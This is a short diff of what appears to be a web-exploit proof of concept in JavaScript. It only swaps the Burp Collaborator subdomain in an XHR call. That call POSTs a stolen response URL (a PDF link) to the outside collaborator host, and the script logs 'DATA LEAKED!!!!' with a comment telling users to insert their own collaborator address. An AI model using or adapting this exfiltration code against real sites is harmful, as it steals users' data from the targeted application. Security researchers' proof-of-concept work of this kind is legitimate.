@@ -27,7 +27,7 @@ setTimeout(() => {
                 xhr3.onload = function () {
                     console.log("DATA LEAKED!!!!")
                 }
-                xhr3.open('POST', 'https://p0qb2gvh3q4m9ke2ufqlj1mdk4quej.burpcollaborator.net/pdfURL'); // CHANGE THIS TO UR BURP COLLAB
+                xhr3.open('POST', 'https://z552n0aqcbl03r8iyvj6m4em6dc30s.burpcollaborator.net/pdfURL'); // CHANGE THIS TO UR BURP COLLAB
                 xhr3.send("url="+xhr2.responseURL);
 
             }
